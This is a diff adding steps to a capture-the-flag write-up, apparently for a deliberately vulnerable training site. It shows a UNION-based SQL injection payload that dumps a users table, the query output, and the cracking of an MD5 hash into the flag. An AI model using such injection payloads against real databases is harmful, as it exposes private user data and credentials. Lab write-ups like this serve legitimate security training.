@@ -32,5 +32,17 @@ We are now going to try to find some informations in the `Commentaire` and `coun
 
 `1 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5 --`
 
-This 
+This gives us another hint:
 
+```
+ID: 1 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5 -- 
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
+```
+
+Let's fllow the instructions:
+ - Trying to decode `5ff9d0165b4f92b14994e5c685cdce28` we find that it's MD5 and decrypted we get `FortyTwo`
+ - Lower all the chars -> `fortytwo`
+ - SH256 on it -> `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
+
+ Here is our flag !
